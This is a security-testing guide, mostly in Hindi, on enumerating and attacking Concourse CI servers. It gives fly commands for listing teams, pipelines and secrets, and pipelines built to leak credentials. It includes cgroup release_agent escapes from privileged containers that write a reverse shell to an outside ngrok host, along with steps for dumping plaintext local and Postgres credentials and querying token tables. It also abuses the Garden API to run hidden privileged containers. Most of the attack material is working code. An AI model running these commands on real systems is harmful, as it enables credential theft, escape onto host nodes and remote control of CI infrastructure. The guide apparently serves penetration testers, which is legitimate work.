# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

### User Roles & Permissions

Concourse में पांच भूमिकाएँ होती हैं:

- _Concourse_ **Admin**: यह भूमिका केवल **मुख्य टीम** (डिफ़ॉल्ट प्रारंभिक concourse टीम) के मालिकों को दी जाती है। एडमिन **अन्य टीमों को कॉन्फ़िगर** कर सकते हैं (जैसे: `fly set-team`, `fly destroy-team`...)। इस भूमिका की अनुमतियाँ RBAC द्वारा प्रभावित नहीं की जा सकती हैं।
- **owner**: टीम के मालिक **टीम के भीतर सब कुछ संशोधित** कर सकते हैं।
- **member**: टीम के सदस्य **टीम के संसाधनों के भीतर पढ़ सकते हैं और लिख सकते हैं** लेकिन टीम सेटिंग्स को संशोधित नहीं कर सकते।
- **pipeline-operator**: पाइपलाइन ऑपरेटर **पाइपलाइन संचालन** कर सकते हैं जैसे कि बिल्ड को ट्रिगर करना और संसाधनों को पिन करना, हालाँकि वे पाइपलाइन कॉन्फ़िगरेशन को अपडेट नहीं कर सकते।
- **viewer**: टीम के दर्शकों को **टीम** और इसके पाइपलाइनों तक **"पढ़ने के लिए केवल"** पहुंच होती है।

> [!NOTE]
> इसके अलावा, **owner, member, pipeline-operator और viewer की भूमिकाओं की अनुमतियाँ** RBAC को कॉन्फ़िगर करके संशोधित की जा सकती हैं (विशेष रूप से इसके कार्यों को कॉन्फ़िगर करना)। इसके बारे में अधिक पढ़ें: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)

ध्यान दें कि Concourse **टीमों के भीतर पाइपलाइनों को समूहित करता है**। इसलिए, एक टीम से संबंधित उपयोगकर्ता उन पाइपलाइनों का प्रबंधन कर सकेंगे और **कई टीमें** हो सकती हैं। एक उपयोगकर्ता कई टीमों से संबंधित हो सकता है और प्रत्येक में विभिन्न अनुमतियाँ हो सकती हैं।

### Vars & Credential Manager

YAML कॉन्फ़िग्स में आप मानों को `((_source-name_:_secret-path_._secret-field_))` सिंटैक्स का उपयोग करके कॉन्फ़िगर कर सकते हैं।\
[From the docs:](https://concourse-ci.org/vars.html#var-syntax) **source-name वैकल्पिक है**, और यदि छोड़ा गया है, तो [क्लस्टर-व्यापी क्रेडेंशियल प्रबंधक](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) का उपयोग किया जाएगा, या मान [स्थैतिक रूप से](https://concourse-ci.org/vars.html#static-vars) प्रदान किया जा सकता है।\
**वैकल्पिक \_secret-field**\_ उस फ़ील्ड को निर्दिष्ट करता है जिसे प्राप्त किए गए रहस्य से पढ़ा जाना है। यदि छोड़ा गया है, तो क्रेडेंशियल प्रबंधक प्राप्त किए गए क्रेडेंशियल से 'डिफ़ॉल्ट फ़ील्ड' पढ़ने का विकल्प चुन सकता है यदि फ़ील्ड मौजूद है।\
इसके अलावा, _**secret-path**_ और _**secret-field**_ को डबल कोट्स `"..."` में रखा जा सकता है यदि वे **विशेष वर्ण** जैसे `.` और `:` शामिल करते हैं। उदाहरण के लिए, `((source:"my.secret"."field:1"))` _secret-path_ को `my.secret` और _secret-field_ को `field:1` पर सेट करेगा।

#### Static Vars

स्थैतिक vars को **कार्य चरणों** में निर्दिष्ट किया जा सकता है:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: { tag: 1.13 }
```
Or using the following `fly` **arguments**:

- `-v` या `--var` `NAME=VALUE` स्ट्रिंग `VALUE` को var `NAME` के लिए मान के रूप में सेट करता है।
- `-y` या `--yaml-var` `NAME=VALUE` `VALUE` को YAML के रूप में पार्स करता है और इसे var `NAME` के लिए मान के रूप में सेट करता है।
- `-i` या `--instance-var` `NAME=VALUE` `VALUE` को YAML के रूप में पार्स करता है और इसे instance var `NAME` के लिए मान के रूप में सेट करता है। instance vars के बारे में अधिक जानने के लिए [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) देखें।
- `-l` या `--load-vars-from` `FILE` `FILE` को लोड करता है, जो मानों के लिए var नामों को मैप करने वाला एक YAML दस्तावेज है, और उन्हें सभी सेट करता है।

#### Credential Management

एक पाइपलाइन में **Credential Manager को निर्दिष्ट करने के विभिन्न तरीके** हैं, इसके बारे में पढ़ें [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html)।\
इसके अलावा, Concourse विभिन्न क्रेडेंशियल प्रबंधकों का समर्थन करता है:

- [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
- [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
- [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
- [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
- [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
- [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
- [Caching credentials](https://concourse-ci.org/creds-caching.html)
- [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
- [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

> [!CAUTION]
> ध्यान दें कि यदि आपके पास **Concourse तक कुछ प्रकार की लिखने की पहुंच** है, तो आप **उन रहस्यों को निकालने के लिए नौकरियां बना सकते हैं** क्योंकि Concourse को उन्हें एक्सेस करने में सक्षम होना चाहिए।

### Concourse Enumeration

एक concourse वातावरण को सूचीबद्ध करने के लिए, आपको पहले **मान्य क्रेडेंशियल्स** इकट्ठा करने की आवश्यकता है या एक **प्रमाणित टोकन** खोजने की आवश्यकता है, जो शायद एक `.flyrc` कॉन्फ़िग फ़ाइल में हो।

#### Login and Current User enum

- लॉगिन करने के लिए आपको **endpoint**, **team name** (डिफ़ॉल्ट `main` है) और **टीम जिसका उपयोगकर्ता सदस्य है** जानना होगा:
- `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
- कॉन्फ़िगर की गई **targets** प्राप्त करें:
- `fly targets`
- यह प्राप्त करें कि कॉन्फ़िगर की गई **target connection** अभी भी **valid** है:
- `fly -t <target> status`
- निर्दिष्ट लक्ष्य के खिलाफ उपयोगकर्ता की **भूमिका** प्राप्त करें:
- `fly -t <target> userinfo`

> [!NOTE]
> ध्यान दें कि **API token** डिफ़ॉल्ट रूप से `$HOME/.flyrc` में **सहेजा** गया है, आप मशीनों को लूटते समय वहां क्रेडेंशियल्स पा सकते हैं।

#### Teams & Users

- टीमों की सूची प्राप्त करें
- `fly -t <target> teams`
- टीम के भीतर भूमिकाएँ प्राप्त करें
- `fly -t <target> get-team -n <team-name>`
- उपयोगकर्ताओं की सूची प्राप्त करें
- `fly -t <target> active-users`

#### Pipelines

- **सूची** पाइपलाइनों की:
- `fly -t <target> pipelines -a`
- पाइपलाइन yaml प्राप्त करें (**संवेदनशील जानकारी** परिभाषा में मिल सकती है):
- `fly -t <target> get-pipeline -p <pipeline-name>`
- सभी पाइपलाइन **config घोषित vars** प्राप्त करें
- `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
- सभी **pipelines secret names used** प्राप्त करें (यदि आप एक नौकरी बना/संशोधित कर सकते हैं या एक कंटेनर को हाईजैक कर सकते हैं तो आप उन्हें निकाल सकते हैं):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Containers & Workers

- List **workers**:
- `fly -t <target> workers`
- List **containers**:
- `fly -t <target> containers`
- List **builds** (to see what is running):
- `fly -t <target> builds`

### Concourse Attacks

#### Credentials Brute-Force

- admin:admin
- test:test

#### Secrets and params enumeration

पिछले अनुभाग में हमने देखा कि आप **पाइपलाइन द्वारा उपयोग किए जाने वाले सभी रहस्यों के नाम और वेरिएबल्स प्राप्त कर सकते हैं**। **वेरिएबल्स में संवेदनशील जानकारी हो सकती है** और **रहस्यों के नाम बाद में उन्हें चुराने की कोशिश करने के लिए उपयोगी होंगे**।

#### Session inside running or recently run container

यदि आपके पास पर्याप्त विशेषाधिकार हैं (**सदस्य भूमिका या अधिक**) तो आप **पाइपलाइनों और भूमिकाओं की सूची** बना सकेंगे और बस `<pipeline>/<job>` **कंटेनर के अंदर एक सत्र प्राप्त कर सकेंगे**:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
इन अनुमतियों के साथ आप सक्षम हो सकते हैं:

- **गुप्त जानकारी** चुराना **कंटेनर** के अंदर
- **नोड** पर **भागने** की कोशिश करना
- **क्लाउड मेटाडेटा** एंडपॉइंट की गणना/दुरुपयोग करना (पॉड से और यदि संभव हो तो नोड से)

#### पाइपलाइन निर्माण/संशोधन

यदि आपके पास पर्याप्त विशेषाधिकार हैं (**सदस्य भूमिका या अधिक**) तो आप **नई पाइपलाइनों को बनाने/संशोधित करने** में सक्षम होंगे। इस उदाहरण को देखें:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
नए **पाइपलाइन** के **संशोधन/निर्माण** के साथ, आप सक्षम होंगे:

- **चुराना** **गुप्त जानकारी** (उन्हें बाहर इको करके या कंटेनर के अंदर जाकर `env` चलाकर)
- **भागना** **नोड** पर (आपको पर्याप्त विशेषाधिकार देकर - `privileged: true`)
- **क्लाउड मेटाडेटा** एंडपॉइंट को सूचीबद्ध/दुरुपयोग करना (पॉड और नोड से)
- बनाए गए पाइपलाइन को **हटाना**

#### कस्टम कार्य निष्पादित करें

यह पिछले तरीके के समान है, लेकिन पूरे नए पाइपलाइन को संशोधित/निर्माण करने के बजाय, आप **बस एक कस्टम कार्य निष्पादित कर सकते हैं** (जो शायद बहुत अधिक **गुप्त** होगा):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### Escaping to the node from privileged task

पिछले अनुभागों में हमने देखा कि **concourse के साथ एक विशेषाधिकार प्राप्त कार्य कैसे निष्पादित करें**। यह कंटेनर को डॉकर कंटेनर में विशेषाधिकार ध्वज के समान सटीक पहुंच नहीं देगा। उदाहरण के लिए, आप /dev में नोड फ़ाइल सिस्टम डिवाइस नहीं देखेंगे, इसलिए बच निकलना अधिक "जटिल" हो सकता है।

निम्नलिखित PoC में हम कुछ छोटे संशोधनों के साथ escape करने के लिए release_agent का उपयोग करने जा रहे हैं:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
> [!WARNING]
> जैसा कि आपने देखा होगा, यह केवल एक [**सामान्य release_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) है, जो नोड में cmd के पथ को संशोधित करता है।

#### एक वर्कर कंटेनर से नोड में भागना

इसके लिए एक सामान्य release_agent escape में एक छोटा संशोधन पर्याप्त है:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Web कंटेनर से नोड पर भागना

भले ही वेब कंटेनर में कुछ सुरक्षा उपाय निष्क्रिय हैं, यह **एक सामान्य विशेषाधिकार प्राप्त कंटेनर के रूप में नहीं चल रहा है** (उदाहरण के लिए, आप **माउंट** नहीं कर सकते और **क्षमताएँ** बहुत **सीमित** हैं, इसलिए कंटेनर से भागने के सभी आसान तरीके बेकार हैं)।

हालांकि, यह **स्थानीय क्रेडेंशियल्स को स्पष्ट पाठ में स्टोर करता है**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
आप उन क्रेडेंशियल्स का उपयोग **वेब सर्वर के खिलाफ लॉगिन करने** और **एक विशेषाधिकार प्राप्त कंटेनर बनाने और नोड पर भागने** के लिए कर सकते हैं।

पर्यावरण में आप **postgresql** उदाहरण तक पहुँचने के लिए जानकारी भी पा सकते हैं जो concourse उपयोग करता है (पता, **उपयोगकर्ता नाम**, **पासवर्ड** और डेटाबेस सहित अन्य जानकारी):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### गार्डन सेवा का दुरुपयोग - एक असली हमला नहीं

> [!WARNING]
> ये सिर्फ सेवा के बारे में कुछ दिलचस्प नोट्स हैं, लेकिन क्योंकि यह केवल लोकलहोस्ट पर सुन रहा है, ये नोट्स कोई ऐसा प्रभाव नहीं डालेंगे जिसे हमने पहले ही शोषण किया है

डिफ़ॉल्ट रूप से, प्रत्येक concourse कार्यकर्ता पोर्ट 7777 में एक [**Garden**](https://github.com/cloudfoundry/garden) सेवा चला रहा होगा। इस सेवा का उपयोग वेब मास्टर द्वारा कार्यकर्ता को **यह बताने के लिए किया जाता है कि उसे क्या निष्पादित करना है** (छवि डाउनलोड करें और प्रत्येक कार्य चलाएं)। यह एक हमलावर के लिए काफी अच्छा लगता है, लेकिन कुछ अच्छी सुरक्षा हैं:

- यह केवल **स्थानीय रूप से** (127..0.0.1) **प्रदर्शित** है और मुझे लगता है कि जब कार्यकर्ता विशेष SSH सेवा के साथ वेब के खिलाफ प्रमाणीकरण करता है, तो एक सुरंग बनाई जाती है ताकि वेब सर्वर **प्रत्येक कार्यकर्ता के अंदर प्रत्येक गार्डन सेवा से बात कर सके**।
- वेब सर्वर **हर कुछ सेकंड में चल रहे कंटेनरों की निगरानी कर रहा है**, और **अप्रत्याशित** कंटेनरों को **हटाया** जाता है। इसलिए यदि आप **एक कस्टम कंटेनर चलाना चाहते हैं** तो आपको वेब सर्वर और गार्डन सेवा के बीच **संवाद** के साथ **छेड़छाड़** करनी होगी।

Concourse कार्यकर्ता उच्च कंटेनर विशेषाधिकारों के साथ चलते हैं:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
हालांकि, /dev डिवाइस को **माउंट** करने जैसी तकनीकें या release_agent **काम नहीं करेंगी** (क्योंकि नोड का असली डिवाइस, जिसमें फाइल सिस्टम है, उपलब्ध नहीं है, केवल एक वर्चुअल है)। हम नोड की प्रक्रियाओं तक पहुँच नहीं सकते, इसलिए कर्नेल एक्सप्लॉइट्स के बिना नोड से भागना जटिल हो जाता है।

> [!NOTE]
> पिछले अनुभाग में हमने देखा कि एक विशेषाधिकार प्राप्त कंटेनर से कैसे भागना है, इसलिए यदि हम **वर्तमान** **कार्यकर्ता** द्वारा बनाए गए **विशेषाधिकार प्राप्त कंटेनर** में कमांड **निष्पादित** कर सकते हैं, तो हम **नोड पर भाग सकते हैं**।

ध्यान दें कि concourse के साथ खेलते समय मैंने देखा कि जब कुछ चलाने के लिए एक नया कंटेनर उत्पन्न होता है, तो कंटेनर प्रक्रियाएँ कार्यकर्ता कंटेनर से सुलभ होती हैं, इसलिए यह एक कंटेनर के अंदर एक नया कंटेनर बनाने जैसा है।

**चल रहे विशेषाधिकार प्राप्त कंटेनर के अंदर जाना**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**नया विशेषाधिकार प्राप्त कंटेनर बनाना**

आप बहुत आसानी से एक नया कंटेनर बना सकते हैं (बस एक यादृच्छिक UID चलाएँ) और उस पर कुछ निष्पादित कर सकते हैं:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
हालांकि, वेब सर्वर हर कुछ सेकंड में चल रहे कंटेनरों की जांच कर रहा है, और यदि कोई अप्रत्याशित कंटेनर पाया जाता है, तो उसे हटा दिया जाएगा। चूंकि संचार HTTP में हो रहा है, आप अप्रत्याशित कंटेनरों के हटने से बचने के लिए संचार में छेड़छाड़ कर सकते हैं:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## संदर्भ

- https://concourse-ci.org/vars.html

{{#include ../../banners/hacktricks-training.md}}
